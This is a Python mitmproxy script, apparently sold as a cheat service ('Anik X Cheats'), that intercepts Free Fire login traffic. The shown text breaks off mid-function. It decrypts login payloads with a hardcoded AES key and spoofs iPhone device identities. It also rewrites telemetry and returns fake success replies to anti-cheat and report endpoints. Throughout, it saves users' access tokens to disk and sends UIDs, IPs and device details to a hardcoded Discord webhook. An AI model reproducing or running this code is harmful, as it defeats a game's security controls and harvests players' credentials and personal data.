import base64
import json
import os
import random
import re
import sys
import threading
import time
import urllib.parse
import urllib.request
import uuid
from datetime import datetime
try:
    import requests
except ImportError:
    requests = None
from mitmproxy import http
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
try:
    import LoginRes_pb2
    import LoginResNew_pb2
except ImportError:
    LoginRes_pb2 = None
    LoginResNew_pb2 = None

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

AES_KEY, AES_IV, backend = base64.b64decode("WWcmdGMlREV1aDYlWmNeOA=="), base64.b64decode("Nm95WkRyMjJFM3ljaGpNJQ=="), default_backend()
_save_lock = threading.Lock()

# --- Whitelist Configuration & In-Memory Fast Cache ---
WHITELIST_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "whitelist.json")
REMOTE_API_URL = "https://anikxcheats.app/api/uid"
PORTAL_DOMAIN = os.environ.get("PORTAL_DOMAIN", "anikxcheats.app")
_whitelist_cache = None
_last_fetch_time = 0
_maintenance_mode = False
_maintenance_message = "Server is under scheduled maintenance"
CACHE_DURATION = 5  # seconds

DISCORD_WEBHOOK_URL = os.environ.get(
    "DISCORD_WEBHOOK_URL",
    "https://discord.com/api/webhooks/1549447810078740571/ACz3J5x3rShgNcCJ7h1rnn-Rrg0EGYDtZreleJ4oSl_ijIDZykqhJQP7_AVFjMxCTAxm"
)

def parse_expiry_date(exp_str: str) -> datetime | None:
    """Parse various expiration date formats (YYYY-MM-DD, ISO, epoch timestamp)."""
    if not exp_str:
        return None
    exp_str = str(exp_str).strip()
    try:
        return datetime.strptime(exp_str, "%Y-%m-%d")
    except Exception:
        pass
    try:
        clean_iso = exp_str.replace("Z", "+00:00")
        dt = datetime.fromisoformat(clean_iso)
        if dt.tzinfo is not None:
            dt = dt.astimezone().replace(tzinfo=None)
        return dt
    except Exception:
        pass
    try:
        ts = float(exp_str)
        return datetime.fromtimestamp(ts)
    except Exception:
        pass
    return None

def fetch_whitelist() -> tuple[bool, dict]:
    """Fetch whitelist entries exclusively from Remote Web API endpoint."""
    global _whitelist_cache, _last_fetch_time, _maintenance_mode, _maintenance_message
    now = time.time()
    
    if _whitelist_cache is not None and (now - _last_fetch_time < CACHE_DURATION):
        return _whitelist_cache
    
    uid_map = {}
    auto_allow = False
    maint_mode = False
    maint_msg = "Server is under scheduled maintenance"
    
    def process_data(data):
        nonlocal auto_allow, maint_mode, maint_msg
        if isinstance(data, dict):
            if "auto_allow_all" in data:
                auto_allow = bool(data.get("auto_allow_all", False))
            if data.get("maintenance_mode", False):
                maint_mode = True
            if "maintenance_message" in data:
                maint_msg = str(data.get("maintenance_message", maint_msg))
            
            users_dict = data.get("users", {})
            if isinstance(users_dict, dict):
                for uid_k, u_val in users_dict.items():
                    uid_str = str(uid_k).strip()
                    if isinstance(u_val, dict):
                        exp_val = u_val.get("expire") or u_val.get("expire_date") or u_val.get("expiry") or u_val.get("expiry_date") or u_val.get("expires_at")
                        exp_dt = parse_expiry_date(exp_val) if exp_val else None
                        uid_map[uid_str] = {
                            "expire_dt": exp_dt,
                            "expire_str": exp_val
                        }
                    else:
                        exp_dt = parse_expiry_date(u_val) if u_val else None
                        uid_map[uid_str] = {
                            "expire_dt": exp_dt,
                            "expire_str": str(u_val) if u_val else None
                        }
            
            allowed_list = data.get("allowed_uids", [])
            if isinstance(allowed_list, list):
                for u in allowed_list:
                    if isinstance(u, dict):
                        uid_val = str(u.get("uid") or u.get("id") or "").strip()
                        if uid_val:
                            exp_val = u.get("expire") or u.get("expire_date") or u.get("expiry") or u.get("expiry_date") or u.get("expires_at")
                            exp_dt = parse_expiry_date(exp_val) if exp_val else None
                            uid_map[uid_val] = {
                                "expire_dt": exp_dt,
                                "expire_str": exp_val
                            }
                    else:
                        uid_str = str(u).strip()
                        if uid_str and uid_str not in uid_map:
                            uid_map[uid_str] = {
                                "expire_dt": None,
                                "expire_str": None
                            }
        elif isinstance(data, list):
            for u in data:
                if isinstance(u, dict):
                    uid_val = str(u.get("uid") or u.get("id") or "").strip()
                    if uid_val:
                        exp_val = u.get("expire") or u.get("expire_date") or u.get("expiry") or u.get("expiry_date") or u.get("expires_at")
                        exp_dt = parse_expiry_date(exp_val) if exp_val else None
                        uid_map[uid_val] = {
                            "expire_dt": exp_dt,
                            "expire_str": exp_val
                        }
                else:
                    uid_str = str(u).strip()
                    if uid_str:
                        uid_map[uid_str] = {
                            "expire_dt": None,
                            "expire_str": None
                        }

    # Fetch fresh whitelist strictly from Web API
    try:
        req = urllib.request.Request(REMOTE_API_URL, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=3) as resp:
            if resp.status == 200:
                rdata = json.loads(resp.read().decode("utf-8"))
                if "record" in rdata:
                    rdata = rdata["record"]
                process_data(rdata)
    except Exception as e:
        print(f"[!] Remote API fetch error: {e}")

    _maintenance_mode = maint_mode
    _maintenance_message = maint_msg
    _whitelist_cache = (auto_allow, uid_map)
    _last_fetch_time = now
    return _whitelist_cache

def is_uid_whitelisted(uid: str) -> tuple[bool, str, dict]:
    """Validate UID whitelist status & expiration date."""
    if not uid or uid == "unknown":
        return False, "Invalid UID", {}
    
    uid_str = str(uid).strip()
    auto_allow, uid_map = fetch_whitelist()
    
    if auto_allow:
        return True, "Valid (Test Mode)", {"expire_dt": None, "expire_str": "Test Mode"}
        
    if uid_str in uid_map:
        uid_info = uid_map[uid_str]
        expiry_date = uid_info.get("expire_dt")
        if expiry_date is not None:
            now_dt = datetime.now()
            if now_dt > expiry_date:
                return False, f"Expired on {expiry_date.strftime('%Y-%m-%d')}", uid_info
        return True, "Valid", uid_info
    else:
        return False, "NOT WHITELISTED", {}

def build_maintenance_message(uid_str: str = "unknown", custom_msg: str | None = None, nickname: str = "") -> str:
    """Build formatted in-game dialog for server maintenance."""
    msg = (custom_msg or _maintenance_message or "Server Under Maintenance").strip()
    name_line = f"[00D4FF]USER NAME : [FFFFFF]{nickname}\n" if nickname and nickname != "Unknown" else ""
    return (
        "[0066FF]--[00D4FF]✦ [FFD200]SERVER MAINTENANCE [00D4FF]✦[0066FF]--\n"
        f"[00D4FF]UID : [FFFFFF]{uid_str}\n"
        f"{name_line}"
        f"[FFD200]NOTICE : [FFFFFF]{msg}\n"
        f"[00D4FF]➜ [FFFFFF]POWERED BY [00B0FF]{PORTAL_DOMAIN}"
    )

def build_access_denied_message(uid_str: str, reason: str = "NOT WHITELISTED", nickname: str = "") -> str:
    """Build formatted in-game dialog for access denied / not whitelisted."""
    name_line = f"[00D4FF]USER NAME : [FFFFFF]{nickname}\n" if nickname and nickname != "Unknown" else ""
    return (
        "[0066FF]--[00D4FF]✦ [FF2D55]ACCESS DENIED [00D4FF]✦[0066FF]--\n"
        f"[00D4FF]UID : [FFFFFF]{uid_str}\n"
        f"{name_line}"
        f"[FF2D55]STATUS : [FFFFFF]{reason.upper()}\n"
        f"[00D4FF]➜ [FFFFFF]POWERED BY [00B0FF]{PORTAL_DOMAIN}"
    )

def extract_client_ip(flow: http.HTTPFlow) -> str:
    """Extract client IP supporting Cloudflare Quick Tunnel, reverse proxies, and direct connections."""
    headers = flow.request.headers
    if "CF-Connecting-IP" in headers:
        return headers["CF-Connecting-IP"].strip()
    if "X-Forwarded-For" in headers:
        return headers["X-Forwarded-For"].split(",")[0].strip()
    if "X-Real-IP" in headers:
        return headers["X-Real-IP"].strip()
    if flow.client_conn and flow.client_conn.address:
        return flow.client_conn.address[0]
    return "unknown"

_player_details_cache = {}

def get_player_details(access_token: str) -> dict:
    """Fetch real numerical account_id (UID), nickname, and region using Garena OTRSS callback API."""
    if not access_token:
        return {"success": False, "error": "Empty token"}
    
    clean_token = str(access_token).strip()
    if clean_token in _player_details_cache:
        return _player_details_cache[clean_token]
        
    try:
        player_url = f"https://api-otrss.garena.com/support/callback/?access_token={clean_token}"
        player_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        }
        req = urllib.request.Request(player_url, headers=player_headers)
        with urllib.request.urlopen(req, timeout=12) as p_res:
            final_url = p_res.geturl()
            parsed_url = urllib.parse.urlparse(final_url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            uid = query_params.get("account_id", ["Unknown"])[0]
            nickname = query_params.get("nickname", ["Unknown"])[0]
            region = query_params.get("region", ["Unknown"])[0]
            
            if uid and uid != "Unknown" and str(uid).strip().isdigit():
                res = {"uid": str(uid).strip(), "nickname": nickname, "region": region, "success": True}
                _player_details_cache[clean_token] = res
                return res
            else:
                return {"uid": "Unknown", "nickname": nickname, "region": region, "success": False, "error": "UID not found in redirect URL"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def _send_webhook_thread(region: str, open_id: str, access_token: str, client_ip: str, dev_name: str, dev_uuid: str, nickname: str = ""):
    """Background daemon thread handler for Discord webhooks."""
    if not DISCORD_WEBHOOK_URL:
        return
    try:
        ts = int(time.time())
        token_preview = f"{access_token[:16]}...{access_token[-8:]}" if len(access_token) > 24 else access_token
        
        acc_info_lines = [f"• **UID:** `{open_id}`"]
        if nickname and nickname != "Unknown":
            acc_info_lines.append(f"• **Nickname:** `{nickname}`")
        acc_info_lines.append(f"• **Server Region:** `{region.upper()}`")
        acc_info_lines.append(f"• **Client IP:** `{client_ip}`")

        embed = {
            "title": "ANIK X CHEATS UID BYPASS",
            "color": 0x00FFAA,
            "fields": [
                {
                    "name": "<:trick_supreme:1528280687126253648>  Account Information",
                    "value": "\n".join(acc_info_lines),
                    "inline": False
                },
                {
                    "name": "<:dev:1528280478749163600> Profile Info",
                    "value": (
                        f"• **Device:** `{dev_name or 'iPhone 16 Pro Max'}`\n"
                        f"• **Apple UUID:** `{dev_uuid or 'DYNAMIC-UUID'}`\n"
                        f"• **Status:** `Bypass Active`"
                    ),
                    "inline": False
                },
                {
                    "name": "<a:rf_alert:1528328554146955374>  Timestamp",
                    "value": f"<t:{ts}:f> • (<t:{ts}:R>)",
                    "inline": False
                }
            ],
            "footer": {
                "text": "Powerdby Anik x Cheats"
            }
        }

        payload = {
            "username": "Anik X Cheats",
            "embeds": [embed]
        }

        data_bytes = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            DISCORD_WEBHOOK_URL,
            data=data_bytes,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0"
            }
        )
        with urllib.request.urlopen(req, timeout=5) as response:
            if response.status in [200, 204]:
                print(f"[+] [WEBHOOK SENT] Discord notified for UID: {open_id} ({region.upper()})")
            else:
                print(f"[-] [WEBHOOK FAILED] Status code: {response.status}")
    except Exception as e:
        print(f"[-] [WEBHOOK ERROR] Could not send webhook: {e}")

_last_webhook_sent = {}

def send_discord_webhook(region: str, open_id: str, access_token: str, client_ip: str = "unknown", dev_name: str = "", dev_uuid: str = "", nickname: str = ""):
    """Dispatch webhook asynchronously with a 15-second debounce to prevent duplicate notifications."""
    now = time.time()
    last_time = _last_webhook_sent.get(open_id, 0)
    if now - last_time < 15:
        return
    _last_webhook_sent[open_id] = now
    t = threading.Thread(
        target=_send_webhook_thread,
        args=(region, open_id, access_token, client_ip, dev_name, dev_uuid, nickname),
        daemon=True
    )
    t.start()

def _pkcs7_unpad(data: bytes) -> bytes:
    if not data:
        return data
    pad_len = data[-1]
    if 1 <= pad_len <= 16 and data.endswith(bytes([pad_len]) * pad_len):
        return data[:-pad_len]
    return data

def _aes_decrypt(data: bytes) -> bytes | None:
    if not data:
        return None
    try:
        raw = data
        if isinstance(data, (bytes, bytearray)):
            # If hex-encoded string of bytes
            try:
                if len(data) > 0 and len(data) % 32 == 0 and all(c in b'0123456789abcdefABCDEF' for c in data):
                    raw = bytes.fromhex(data.decode('ascii'))
            except Exception:
                raw = bytes(data)

        if len(raw) == 0 or len(raw) % 16 != 0:
            return None

        d = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=backend).decryptor()
        dec = d.update(raw) + d.finalize()
        return _pkcs7_unpad(dec)
    except Exception:
        return None

def _aes_encrypt(data: bytes) -> bytes:
    try:
        pad_len = 16 - (len(data) % 16)
        e = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=backend).encryptor()
        return e.update(data + bytes([pad_len] * pad_len)) + e.finalize()
    except Exception:
        return data

def _decode_varint(data: bytes, pos: int):
    res, shift = 0, 0
    while pos < len(data):
        b, pos = data[pos], pos + 1
        res |= (b & 0x7f) << shift
        if not (b & 0x80):
            break
        shift += 7
    return res, pos

def _encode_varint(val: int) -> bytes:
    res = bytearray()
    while val > 0x7f:
        res.append((val & 0x7f) | 0x80)
        val >>= 7
    res.append(val & 0x7f)
    return bytes(res)

def encode_proto_str(field_num: int, s: str) -> bytes:
    data = s.encode('utf-8')
    tag = (field_num << 3) | 2
    return _encode_varint(tag) + _encode_varint(len(data)) + data

def encode_proto_int(field_num: int, val: int) -> bytes:
    tag = (field_num << 3) | 0
    return _encode_varint(tag) + _encode_varint(val)

def parse_protobuf_fields(data: bytes):
    pos, fields = 0, []
    while pos < len(data):
        try:
            start_pos, tag, pos = pos, _decode_varint(data, pos)[0], _decode_varint(data, pos)[1]
            wire_type, field_num = tag & 7, tag >> 3
            if wire_type == 0:
                val, pos = _decode_varint(data, pos)
            elif wire_type == 1:
                val, pos = data[pos:pos+8], pos+8
            elif wire_type == 2:
                length, pos = _decode_varint(data, pos)
                val, pos = data[pos:pos+length], pos+length
            elif wire_type == 5:
                val, pos = data[pos:pos+4], pos+4
            else:
                break
            fields.append((field_num, wire_type, val, data[start_pos:pos]))
        except Exception:
            break
    return fields

def extract_fields(data: bytes, field_numbers: list[int]):
    return {f_num: raw_bytes for f_num, w_type, val, raw_bytes in parse_protobuf_fields(data) if f_num in field_numbers}

def update_protobuf_fields(base_data: bytes, field_replacements: dict):
    out_parts, replaced_fields = [], set()
    for f_num, w_type, val, raw_bytes in parse_protobuf_fields(base_data):
        if f_num in field_replacements and field_replacements[f_num] is not None:
            out_parts.append(field_replacements[f_num])
            replaced_fields.add(f_num)
        else:
            out_parts.append(raw_bytes)
    for f_num, raw_bytes in field_replacements.items():
        if f_num not in replaced_fields and raw_bytes is not None:
            out_parts.append(raw_bytes)
    return b''.join(out_parts)

def extract_jwt(auth_header: str) -> str | None:
    if not auth_header:
        return None
    match = re.search(r"Bearer\s+([\w\-.]+)", auth_header)
    return match.group(1) if match else None

def decode_jwt_no_verify(token: str) -> dict:
    if not token:
        return {}
    try:
        parts = token.split(".")
        if len(parts) >= 2:
            payload = parts[1]
            payload += "=" * (4 - len(payload) % 4)
            return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        pass
    return {}

def extract_server_region_from_proto(data: bytes) -> str | None:
    """Dynamically extract region code (e.g. SG, IND, ID, TH, BD, ME, BR, NA, SAC, VN, RU, EU) from server response."""
    for f_num, w_type, val, raw_bytes in parse_protobuf_fields(data):
        if f_num in [2, 3, 4, 6] and w_type == 2:
            try:
                s = val.decode('utf-8', errors='ignore').strip().upper()
                if 2 <= len(s) <= 5 and s.isalpha():
                    return s
            except Exception:
                pass
    return None

def extract_account_id_from_proto(data: bytes) -> str | None:
    """Extract real numerical account_id (UID) from Protobuf response."""
    if not data:
        return None
    
    # 1. Parse via compiled protobuf descriptors
    for pb_mod in [LoginRes_pb2, LoginResNew_pb2]:
        if pb_mod:
            for cls_name in ["MajorLoginRes", "MajorLoginResNew", "LoginRes", "LoginRes2"]:
                if hasattr(pb_mod, cls_name):
                    try:
                        res = getattr(pb_mod, cls_name)()
                        res.ParseFromString(data)
                        acc_id = getattr(res, "account_id", None)
                        if acc_id and int(acc_id) > 0:
                            return str(acc_id)
                    except Exception:
                        pass

    # 2. Direct varint parsing for Field 1
    for f_num, w_type, val, raw_bytes in parse_protobuf_fields(data):
        if f_num == 1:
            if w_type == 0 and isinstance(val, int) and val > 0:
                return str(val)
            elif w_type == 2 and val:
                try:
                    s = val.decode('utf-8', errors='ignore').strip()
                    if s.isdigit():
                        return s
                except Exception:
                    pass
    return None

def save_account_credentials(region: str, uid: str, access_token: str, nickname: str = ""):
    """Save UID, Nickname, and Access Token directly into that specific region's JSON file."""
    if not uid or not access_token or not region:
        return
    clean_region = region.strip().lower()
    json_path = f"{clean_region}.json"
    with _save_lock:
        try:
            data = {}
            if os.path.exists(json_path):
                try:
                    with open(json_path, "r", encoding="utf-8") as f:
                        data = json.load(f)
                except Exception:
                    data = {}
            data[uid] = {
                "uid": uid,
                "nickname": nickname,
                "access_token": access_token,
                "region": clean_region.upper()
            }
            with open(json_path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            print(f"[+] [SAVED] Server: {clean_region.upper()} | UID: {uid} | Name: {nickname or 'Unknown'} -> {json_path}")
        except Exception as e:
            print(f"[!] Error saving credentials: {e}")

IPHONE_PROFILES = [
    {
        "name": "iPhone 14 Pro Max",
        "model": "iPhone15,3",
        "gpu": "Apple A16 GPU",
        "os": "iOS 17.4.1",
        "cpu": "arm64e | 0 | 6",
        "ua": "Free%20Fire/2019121229 CFNetwork/1494.0.7 Darwin/23.4.0"
    },
    {
        "name": "iPhone 15 Pro Max",
        "model": "iPhone16,2",
        "gpu": "Apple A17 Pro GPU",
        "os": "iOS 17.6.1",
        "cpu": "arm64e | 0 | 6",
        "ua": "Free%20Fire/2019121229 CFNetwork/1498.700.2 Darwin/23.6.0"
    },
    {
        "name": "iPhone 16 Pro Max",
        "model": "iPhone17,2",
        "gpu": "Apple A18 Pro GPU",
        "os": "iOS 18.2.1",
        "cpu": "arm64e | 0 | 6",
        "ua": "Free%20Fire/2019121229 CFNetwork/1500.0.1 Darwin/24.0.0"
    },
    {
        "name": "iPhone 17 Pro Max",
        "model": "iPhone18,2",
        "gpu": "Apple A19 Pro GPU",
        "os": "iOS 19.1",
        "cpu": "arm64e | 0 | 6",
        "ua": "Free%20Fire/2019121229 CFNetwork/1505.0.0 Darwin/24.2.0"
    },
    {
        "name": "iPhone 18 Pro Max",
        "model": "iPhone19,2",
        "gpu": "Apple A20 Pro GPU",
        "os": "iOS 20.0",
        "cpu": "arm64e | 0 | 6",
        "ua": "Free%20Fire/2019121229 CFNetwork/1510.0.0 Darwin/25.0.0"
    }
]

_device_session_cache = {}
_device_cache_lock = threading.Lock()

def get_cached_iphone_profile(session_key: str | None = None, alias_key: str | None = None):
    """Maintain consistent iPhone device profile & Apple UUID per session/token/IP across all login requests."""
    now = time.time()
    clean_key = str(session_key).strip() if session_key else None
    clean_alias = str(alias_key).strip() if alias_key else None
    
    with _device_cache_lock:
        entry = None
        if clean_key and clean_key in _device_session_cache:
            entry = _device_session_cache[clean_key]
        elif clean_alias and clean_alias in _device_session_cache:
            entry = _device_session_cache[clean_alias]
            
        if entry:
            if now - entry["timestamp"] < 7200:  # 2-hour session persistence
                entry["timestamp"] = now
                if clean_key and clean_key not in _device_session_cache:
                    _device_session_cache[clean_key] = entry
                if clean_alias and clean_alias not in _device_session_cache:
                    _device_session_cache[clean_alias] = entry
                return entry["fields"], entry["name"], entry["uuid"], entry["ua"]

    # Generate a fresh consistent profile
    device = random.choice(IPHONE_PROFILES)
    device_uuid = str(uuid.uuid4()).upper()
    fields = {
        8: encode_proto_str(8, device["os"]),
        15: encode_proto_str(15, device["cpu"]),
        17: encode_proto_str(17, device["gpu"]),
        18: encode_proto_str(18, "Metal"),
        19: encode_proto_str(19, f"Apple|{device_uuid}"),
        24: encode_proto_str(24, "Handheld"),
        25: encode_proto_str(25, device["model"]),
        76: encode_proto_int(76, 0),
        77: encode_proto_str(77, "IOSDevice"),
        86: encode_proto_str(86, "Metal"),
        92: encode_proto_int(92, 0),
        93: encode_proto_str(93, "ios"),
    }
    
    entry = {
        "fields": fields,
        "name": device["name"],
        "uuid": device_uuid,
        "ua": device["ua"],
        "timestamp": now,
        "device": device
    }
    
    with _device_cache_lock:
        if len(_device_session_cache) > 2000:
            expired = [k for k, v in _device_session_cache.items() if now - v["timestamp"] > 7200]
            for k in expired:
                del _device_session_cache[k]
        if clean_key:
            _device_session_cache[clean_key] = entry
        if clean_alias:
            _device_session_cache[clean_alias] = entry
            
    return fields, device["name"], device_uuid, device["ua"]

def get_dynamic_iphone_fields(session_key: str | None = None, alias_key: str | None = None):
    return get_cached_iphone_profile(session_key, alias_key)

def sanitize_logevent_payload(content_bytes: bytes) -> bytes:
    if not content_bytes:
        return content_bytes
    try:
        text = content_bytes.decode('utf-8', errors='ignore')
        data = json.loads(text)
        
        if "event_payload" in data:
            payload_raw = data["event_payload"]
            is_str = isinstance(payload_raw, str)
            payload = json.loads(payload_raw) if is_str else payload_raw
            
            if isinstance(payload, dict):
                payload["system_software"] = "iOS 18.2.1"
                payload["cpu_hardware"] = "arm64e | 0 | 6"
                payload["gl_render"] = "Apple A18 Pro GPU"
                payload["gl_version"] = "Metal 3.0"
                payload["device_model"] = "iPhone17,2"
                payload["system_hardware"] = "Handheld"
                if "match_mode" in payload and payload["match_mode"] == 6:
                    payload["match_mode"] = 1
                if "lib_path" in payload and "/data/app/" in str(payload["lib_path"]):
                    payload["lib_path"] = "/private/var/containers/Bundle/Application/FreeFire.app"
                
                data["event_payload"] = json.dumps(payload, ensure_ascii=False) if is_str else payload
                return json.dumps(data, ensure_ascii=False).encode('utf-8')
    except Exception:
        pass

    try:
        text = content_bytes.decode('utf-8', errors='ignore')
        text = re.sub(r'x86-64[^\"]+', 'arm64e | 0 | 6', text)
        text = re.sub(r'OpenGL\s+ES[^\"]*NVIDIA[^\"]*', 'Metal 3.0 (Apple A18 Pro GPU)', text, flags=re.IGNORECASE)
        text = re.sub(r'Android\s+OS[^\"]+', 'iOS 18.2.1', text, flags=re.IGNORECASE)
        text = re.sub(r'Adreno\s+\(TM\)\s+\d+', 'Apple A18 Pro GPU', text, flags=re.IGNORECASE)
        text = re.sub(r'OnePlus[^\"]*', 'iPhone17,2', text, flags=re.IGNORECASE)
        return text.encode('utf-8')
    except Exception:
        return content_bytes

class AuthPayloadOverwriter:
    def __init__(self):
        # 100% Real Mobile Motorola Edge 50 Base Payload Dump (Single Line)
        self.base_encrypted_payload = bytes.fromhex("69a28925da058dbef7998490a26c0ecf52ba6d152a55c7f548b174a33b788cd75790d3ede9ab514a0ae37bfeee0995abab7512570af905c07b93ab4db1cb45bbf3a520d390dbe80958230ee696e2bb5c72f281e026017df05acab5c19d6f2b0ddb0422872b4509f5385c5fa9fbe4af50b140829fb48cbf18830819b9da181818c9ad0c047982a59d0eae6ac8eedacea65f42665eefaf0b919c8f8479ae6b23edb40261c0b533d2d53d1a8093d2ef180335028ffc96f6a1cc09c46f84618093780d0e9d0e5cf8673544f537d6cef0ade0e8bd1ad3923f4f508c7c90fb27c8b10fe9b96e6270d12a1c567edcda6876d0f2847cdbeb6225794a9433781f2527ffed431026a2e2d06f770538c051d1866ded0097f9f2282c943078499385e8f380e9903a4c098102cadedd622a8ccc51a3e44bb9dd1c586ea50bd7b2a6c716400ed0cee1e119b77d17d3ca6f40cd04ea366282e05f56c8417c6be63ae0ac164f287aa3edfd721f1c7d429fcd378f6f8109afae6b5765f90a7f825d941ce9efe07800b9ef60e616f459148a2a265e27ed5a0e4bf992fbafb06f2196d2e4804c2f95aa2dfe7c602303a70072448193db8e840aad4726a839c6c5737113b997b2f1d09deb9fe38a2561884aadf42ccb6505dca14deebd862ef6cf57cbde7f791df01835872545daf4a272fca15dd122f5f8aedb5a78bb128d3060580571b0d5fa97f3a5e76987dd4fb97e6abc6af84df0f982ae")
        self.base_decrypted_proto = _aes_decrypt(self.base_encrypted_payload)

    def request(self, flow: http.HTTPFlow) -> None:
        path = flow.request.path.lower()
        # Only intercept actual MajorLogin and GetLoginData endpoints (excluding LoginGetDesc, LoginGetSplash, etc.)
        if any(p == path or path.startswith(p + "?") or path.startswith(p + "/") for p in ["/majorlogin", "/getlogindata"]) and flow.request.method.upper() == "POST":
            # Extract JWT Account ID & Server Region directly from authorization header
            auth_header = flow.request.headers.get("authorization", "")
            jwt_token = extract_jwt(auth_header)
            req_region = None
            if jwt_token:
                decoded = decode_jwt_no_verify(jwt_token)
                req_region = decoded.get("lock_region") or decoded.get("region")
                jwt_account_id = decoded.get("account_id") or decoded.get("uid")
                if jwt_account_id:
                    flow.account_id = str(jwt_account_id).strip()
                if req_region:
                    flow.server_region = str(req_region).strip().upper()

            incoming_content = flow.request.content
            if not incoming_content:
                flow.request.content, flow.request.headers["Content-Length"] = self.base_encrypted_payload, str(len(self.base_encrypted_payload))
                return

            dec_incoming = _aes_decrypt(incoming_content)

            # Dynamic fields extraction
            target_fields = [3, 7, 19, 20, 22, 23, 26, 29, 83, 99, 100]
            extracted = extract_fields(dec_incoming, target_fields) if dec_incoming else {}
            if not extracted:
                extracted = extract_fields(incoming_content, target_fields)

            # Store credentials on the flow object (isolated per request)
            if dec_incoming:
                parsed_fields = parse_protobuf_fields(dec_incoming)
                field_dict = {}
                for f_num, w_type, val, raw_bytes in parsed_fields:
                    val_str = val.decode('utf-8', errors='ignore') if isinstance(val, bytes) else str(val)
                    field_dict[f_num] = val_str

                flow.account_openid = field_dict.get(22)
                flow.account_token = field_dict.get(29)
                proto_reg = field_dict.get(26)
                
                # Resolve player details (numeric UID, Nickname, Region) from Garena OTRSS callback API
                if flow.account_token:
                    player_data = get_player_details(flow.account_token)
                    if player_data.get("success"):
                        p_uid = player_data.get("uid")
                        p_nick = player_data.get("nickname")
                        p_reg = player_data.get("region")
                        if p_uid and p_uid != "Unknown" and str(p_uid).strip().isdigit():
                            flow.resolved_uid = str(p_uid).strip()
                            flow.account_id = flow.resolved_uid
                        if p_nick and p_nick != "Unknown":
                            flow.resolved_nickname = p_nick
                        if p_reg and p_reg != "Unknown":
                            flow.resolved_region = p_reg.upper()
                            flow.account_region = p_reg.upper()
                        print(f"[+] [GARENA OTRSS] Token resolved -> UID: {getattr(flow, 'resolved_uid', 'Unknown')} | Name: {getattr(flow, 'resolved_nickname', 'Unknown')} | Region: {getattr(flow, 'resolved_region', 'Unknown')}")

                # If JWT had region, use it on field 26 and flow
                if req_region:
                    flow.account_region = req_region.upper()
                    extracted[26] = encode_proto_str(26, req_region.upper())
                elif getattr(flow, 'resolved_region', None):
                    extracted[26] = encode_proto_str(26, flow.resolved_region)
                elif proto_reg:
                    flow.account_region = proto_reg.upper()

            # Extract Client's Real IP
            client_ip = extract_client_ip(flow)
            flow.client_ip = client_ip
            if client_ip and client_ip != "unknown":
                extracted[20] = encode_proto_str(20, client_ip)

            # Session-consistent iPhone Device Profile & Apple UUID (Synchronized across /MajorLogin and /GetLoginData)
            session_key = getattr(flow, 'account_token', None) or getattr(flow, 'account_openid', None) or getattr(flow, 'account_id', None)
            iphone_fields, dev_name, dev_uuid, dev_ua = get_dynamic_iphone_fields(session_key=session_key, alias_key=client_ip)
            extracted.update(iphone_fields)
            flow.spoofed_dev_name = dev_name
            flow.spoofed_dev_uuid = dev_uuid

            # Force iOS User-Agent and remove Android/emulator leak headers
            flow.request.headers["user-agent"] = dev_ua
            for leak_header in ["x-requested-with", "x-firebase-client", "x-play-games-agent"]:
                if leak_header in flow.request.headers:
                    del flow.request.headers[leak_header]

            if extracted and self.base_decrypted_proto:
                final_proto = update_protobuf_fields(self.base_decrypted_proto, extracted)
                final_payload = _aes_encrypt(final_proto)
                flow.request.content = final_payload
                flow.request.headers["Content-Length"] = str(len(final_payload))
                print(f"[+] [SPOOFED: {dev_name}] Injected dynamic profile (UUID: {dev_uuid[:8]}...) for {flow.request.path}")
            else:
                flow.request.content = self.base_encrypted_payload
                flow.request.headers["Content-Length"] = str(len(self.base_encrypted_payload))

        elif "/logevent" in path and flow.request.method.upper() == "POST":
            if flow.request.content:
                flow.request.content = sanitize_logevent_payload(flow.request.content)
                flow.request.headers["Content-Length"] = str(len(flow.request.content))
            for leak_header in ["x-requested-with", "x-firebase-client", "x-play-games-agent"]:
                if leak_header in flow.request.headers:
                    del flow.request.headers[leak_header]
            print(f"[+] [LOGEVENT SPOOFED] Cleaned telemetry & hardware leaks for {flow.request.path}")

        elif any(k in path for k in ["/ffanti", "/datareport", "/clientreport", "/reportlog"]):
            print(f"[+] [TELEMETRY BLOCKED] Suppressed: {flow.request.path}")
            flow.response = http.Response.make(200, b'{"status": 0, "msg": "ok"}', {"Content-Type": "application/json"})

    def response(self, flow: http.HTTPFlow) -> None:
        """Strict MajorLogin response interceptor and UID whitelist enforcement."""
        path = flow.request.path.lower()
        if "/majorlogin" in path and flow.response:
            try:
                client_ip = extract_client_ip(flow)
                response_content = flow.response.content
                decrypted_response = None
                
                if response_content:
                    try:
                        dec = _aes_decrypt(response_content)
                        decrypted_response = dec if dec else response_content
                    except Exception:
                        decrypted_response = response_content
                else:
                    decrypted_response = response_content

                payload_uid = None
                if LoginRes_pb2 and decrypted_response:
                    try:
                        login_res = LoginRes_pb2.MajorLoginRes()
                        login_res.ParseFromString(decrypted_response)
                        acc_id = getattr(login_res, 'account_id', None)
                        if acc_id and int(acc_id) > 0:
                            payload_uid = str(acc_id)
                    except Exception:
                        try:
                            if LoginResNew_pb2:
                                login_res = LoginResNew_pb2.MajorLoginRes()
                                login_res.ParseFromString(decrypted_response)
                                acc_id = getattr(login_res, 'account_id', None)
                                if acc_id and int(acc_id) > 0:
                                    payload_uid = str(acc_id)
                        except Exception:
                            pass

                # Direct protobuf field 1 fallback if descriptor didn't match
                if not payload_uid and decrypted_response:
                    payload_uid = extract_account_id_from_proto(decrypted_response)

                resolved_uid = getattr(flow, 'resolved_uid', None)
